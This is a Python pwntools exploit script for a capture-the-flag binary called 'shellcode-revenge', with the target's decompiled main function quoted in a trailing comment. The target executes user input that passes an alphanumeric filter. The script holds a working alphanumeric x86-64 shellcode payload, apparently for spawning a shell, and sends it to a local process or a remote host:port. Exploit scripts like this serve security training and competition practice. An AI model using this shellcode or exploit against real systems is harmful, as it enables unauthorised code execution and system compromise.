#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './shellcode-revenge'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget
prdi = 0x00000000000012bb # pop rdi ; ret

# elf, libc

# rop1
offset = 0
payload = 'A'*offset
payload += 'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t'

se(payload)

p.interactive()

'''

undefined8 main(void)

{
  ssize_t sVar1;
  undefined buf [1032];
  int len;
  int i;
  
  write(1,"Show me your magic!\n",0x14);
  sVar1 = read(0,buf,0x400);
  len = (int)sVar1;
  if (0 < len) {
    i = 0;
    while (i < len) {
      if (((((char)buf[i] < 'a') || ('z' < (char)buf[i])) &&
          (((char)buf[i] < 'A' || ('Z' < (char)buf[i])))) &&
         (((char)buf[i] < '0' || ('Z' < (char)buf[i])))) {
        printf("I Can\'t Read This!");
        return 0;
      }
      i = i + 1;
    }
    (*(code *)buf)();
  }
  return 0;
}

'''
